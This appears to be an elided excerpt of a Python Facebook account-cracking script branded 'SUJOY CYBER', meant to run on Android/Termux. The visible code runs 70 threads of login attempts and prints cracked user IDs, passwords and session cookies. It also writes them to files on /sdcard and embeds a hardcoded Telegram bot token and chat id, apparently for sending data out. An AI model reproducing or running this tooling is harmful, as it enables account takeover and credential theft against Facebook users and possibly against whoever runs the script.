...
ha = current.day
today = date.today()
os.system('xdg-open https://m.me/mrsujoy11')
import os
...
def xxr():
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[38;5;46m 𝗖𝗬𝗕𝗘𝗥 SUJOY')
        print('\033[38;5;46m══════════════════════════════════')
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 SUJOY\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎❴\033[38;5;46m𝙇𝙄𝙏𝙀+𝙇𝙊𝙂𝙄𝙉❵\033[37;1m : {coki}
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 SUJOY\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     SUJOY 𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     SUJOY  𝘽𝙊𝙎𝙎 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/SUJOY-𝗖𝗬𝗕𝗘𝗥-𝟬𝟰𝟵𝟵-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
...
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open('/sdcard/\033[38;5;46mSUJOY-𝗖𝗬𝗕𝗘𝗥-𝟬𝟰𝟵𝟵-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
#______𝑬𝑴𝑶𝑱𝑰-𝑪𝑹𝑲-𝑺𝒀𝑺𝑻𝑬𝑴👇👇👇👇 
        brand=random.choice(['SUJOY CYBER','SUJOY-CYBER ','SUJOY CRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝SUJOY𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mSUJOY-𝗖𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def suyaib():
    ...
    bot_token = '6903866948:AAHM83ZNRo8wRTrfNs57ubkKXThm5TSAFYs' 
    chat_id = '6205994308'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
